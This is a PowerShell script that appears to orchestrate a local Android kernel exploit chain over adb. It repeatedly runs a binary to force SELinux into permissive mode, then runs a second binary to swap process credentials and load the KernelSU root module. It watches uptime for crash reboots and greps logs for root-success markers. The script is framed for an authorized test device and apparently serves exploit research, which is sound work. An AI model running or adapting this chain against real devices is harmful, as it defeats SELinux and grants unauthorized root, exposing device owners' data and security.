$RepoRoot = Split-Path $PSScriptRoot -Parent
# Two-phase flow: phase A gets SELinux permissive one attempt at a time,
# phase B does the cred swap (single stage) and then loads KernelSU.
$ErrorActionPreference = "Continue"
$dev = $env:ANDROID_SERIAL
if (-not $dev) { throw "Set ANDROID_SERIAL to the authorized test device serial." }
$out = "$RepoRoot\ab-logs\twophase.txt"

function Log($m) { $m | Tee-Object -FilePath $out -Append }
function Up   { [double]((adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join "") }
function Mode { ((adb -s $dev shell "getenforce") -join "").Trim() }
function Sh($c) { (adb -s $dev shell $c) -join " " }

Remove-Item $out -ErrorAction SilentlyContinue
Log "=== twophase start $(Get-Date -Format HH:mm:ss)"

# --- phase A: SELinux ---
$okA = $false
for ($i = 1; $i -le 8; $i++) {
    if ((Mode) -eq "Permissive") { $okA = $true; break }
    Sh "chmod 755 /data/local/tmp/pure.bin" | Out-Null
    $u0 = Up
    Sh "cd /data/local/tmp; ./pure.bin 10000 8192 0 0 1 1 8000 200 > pa_$i.log 2>&1" | Out-Null
    $u1 = Up
    $m  = Mode
    Log "[A$i] up $([math]::Round($u0))->$([math]::Round($u1)) mode=$m"
    if ($m -eq "Permissive") { $okA = $true; Log "[A$i] SELINUX PERMISSIVE"; break }
    if ($u1 -lt $u0) { Start-Sleep -Seconds 35 }
}
if (-not $okA) { Log "phase A failed"; exit }

# --- phase B: cred + KSU ---
for ($j = 1; $j -le 3; $j++) {
    if ((Mode) -ne "Permissive") { Log "[B$j] lost permissive, stopping"; break }
    $u0 = Up
    Sh "cd /data/local/tmp; rm -f pb_$j.log o3p_insmod.out; O3P_NOSEL=1 ./o3pR.bin 10000 8192 0 0 6 1 8000 200 > pb_$j.log 2>&1" | Out-Null
    $u1  = Up
    $mod = (Sh "grep -c kernelsu /proc/modules 2>/dev/null").Trim()
    $key = Sh "grep -a -E 'UIDNOW|KSU_MODULE|KSU_INSMOD|KSU_WROTE|KSU_EXEC' /data/local/tmp/pb_$j.log | tail -8"
    $ins = Sh "cat /data/local/tmp/o3p_insmod.out 2>/dev/null"
    $rbt = ($u1 -lt $u0)
    Log "[B$j] up $([math]::Round($u0))->$([math]::Round($u1)) reboot=$rbt kernelsu=$mod"
    if ($key.Trim().Length -gt 0) { Log "     $key" }
    if ($ins.Trim().Length -gt 0) { Log "     insmod: $ins" }
    if ($mod -eq "1") { Log "[B$j] *** KERNELSU LIVE ***"; break }
    if ($rbt) { Start-Sleep -Seconds 40; break }
}
Log "=== twophase end $(Get-Date -Format HH:mm:ss) mode=$(Mode)"
